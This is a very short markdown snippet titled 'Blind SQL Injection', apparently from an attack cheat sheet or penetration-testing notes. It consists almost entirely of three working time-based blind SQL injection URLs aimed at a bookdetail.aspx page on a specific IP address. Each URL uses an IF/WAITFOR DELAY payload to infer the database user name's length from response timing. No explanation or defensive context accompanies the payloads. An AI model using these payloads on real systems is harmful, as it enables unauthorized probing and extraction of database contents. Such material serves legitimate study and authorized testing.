#### Blind SQL Injection

```
http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=1) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=2) WAITFOR DELAY '00:00:10'--
http://45.77.162.239/bookdetail.aspx?id=2; IF (LEN(USER)=3) WAITFOR DELAY '00:00:10'-- 
```

```

```
